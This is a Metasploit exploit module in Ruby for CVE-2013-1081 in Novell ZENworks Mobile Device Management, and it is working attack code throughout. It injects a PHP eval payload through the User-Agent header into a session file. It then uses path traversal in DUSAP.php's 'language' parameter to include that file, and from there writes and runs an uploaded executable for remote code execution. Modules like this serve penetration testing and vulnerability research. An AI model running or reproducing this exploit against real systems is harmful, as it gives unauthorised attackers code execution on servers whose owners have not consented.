##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
 
  def initialize
    super(
      'Name'           => 'Novell Zenworks Mobile Device Managment Local File Inclusion Vulnerability',
      'Description'    => %q{
        This module attempts to gain remote code execution on a server running
        Novell Zenworks Mobile Device Management.
      },
      'Author'         =>
        [
          'steponequit',
          'Andrea Micalizzi (aka rgod)' #zdi report
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Novell Zenworks Mobile Device Management on Windows', {} ],
        ],
      'DefaultTarget'  => 0,
      'References'     =>
        [
          ['CVE', '2013-1081'],
          ['OSVDB', '91119'],
          ['URL', 'http://www.novell.com/support/kb/doc.php?id=7011895']
        ],
      'DisclosureDate' => "Mar 13 2013",
      'License'        => MSF_LICENSE
    )
 
    register_options([
      OptString.new('TARGETURI', [true, 'Path to the Novell Zenworks MDM install', '/']),
      OptInt.new('RPORT', [true, "Default remote port", 80])
    ], self.class)
 
    register_advanced_options([
      OptBool.new('SSL', [true, "Negotiate SSL connection", false])
    ], self.class)
  end
 
  def peer
    "#{rhost}:#{rport}"
  end
 
  def get_version
    version = nil
 
    res = send_request_raw({
      'method' => 'GET',
      'uri' => target_uri.path
    })
 
    if (res and res.code == 200 and res.body.to_s.match(/ZENworks Mobile Management User Self-Administration Portal/) != nil)
      version = res.body.to_s.match(/<p id="version">Version (.*)<\/p>/)[1]
    end
 
    return version
  end
 
  def check
    v = get_version
    print_status("#{peer} - Detected version: #{v || 'Unknown'}")
 
    if v.nil?
      return Exploit::CheckCode::Unknown
    elsif v =~ /^2\.6\.[01]/ or v =~ /^2\.7\.0/
      # Conditions based on OSVDB info
      return Exploit::CheckCode::Vulnerable
    end
 
    return Exploit::CheckCode::Safe
  end
 
  def setup_session()
    sess = Rex::Text.rand_text_alpha(8)
    cmd = Rex::Text.rand_text_alpha(8)
    res = send_request_cgi({
      'agent' => "<?php echo(eval($_GET['#{cmd}'])); ?>",
      'method' => "HEAD",
      'uri' => normalize_uri("#{target_uri.path}/download.php"),
      'headers' => {"Cookie" => "PHPSESSID=#{sess}"},
    })
    return sess,cmd
  end
 
  def upload_shell(session_id,cmd_var)
    fname   = Rex::Text.rand_text_alpha(8)
    payload = generate_payload_exe
    cmd     = "$wdir=getcwd().'\\\\..\\\\..\\\\php\\\\temp\\\\';"
    cmd    << "file_put_contents($wdir.'#{fname}.exe',"
    cmd    << "base64_decode(file_get_contents('php://input')));"
 
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path, "DUSAP.php"),
      'data'     => Rex::Text.encode_base64(payload),
      'vars_get' => {
        'language' => "res/languages/../../../../php/temp/sess_#{session_id}",
        cmd_var    => cmd
      }
    })
    return fname
  end
 
  def exec_shell(session_id,cmd_var,fname)
    cmd  = "$wdir=getcwd().'\\\\..\\\\..\\\\php\\\\temp\\\\';"
    cmd << "$cmd=$wdir.'#{fname}';"
    cmd << "$output=array();"
    cmd << "$handle=proc_open($cmd,array(1=>array('pipe','w')),"
    cmd << "$pipes,null,null,array('bypass_shell'=>true));"
    cmd << "if (is_resource($handle)){fclose($pipes[1]);proc_close($handle);}"
 
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path, "DUSAP.php"),
      'data'     => Rex::Text.encode_base64(payload),
      'vars_get' => {
        'language' => "res/languages/../../../../php/temp/sess_#{session_id}",
        cmd_var    => cmd
      }
    })
  end
 
 
  def exploit()
    begin
      print_status("#{peer} - Checking application version...")
      v = get_version
      if v.nil?
        print_error("#{peer} - Unable to detect version, abort!")
        return
      end
 
      print_good("#{peer} - Found Version #{v}")
      print_status("#{peer} - Setting up poisoned session")
      session_id,cmd = setup_session()
      print_status("#{peer} - Uploading payload")
      fname = upload_shell(session_id,cmd)
      print_status("#{peer} - Executing payload")
      exec_shell(session_id,cmd,fname)
 
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    rescue ::OpenSSL::SSL::SSLError => e
      return if(e.to_s.match(/^SSL_connect /) ) # strange errors / exception if SSL connection aborted
    end
  end
 
end
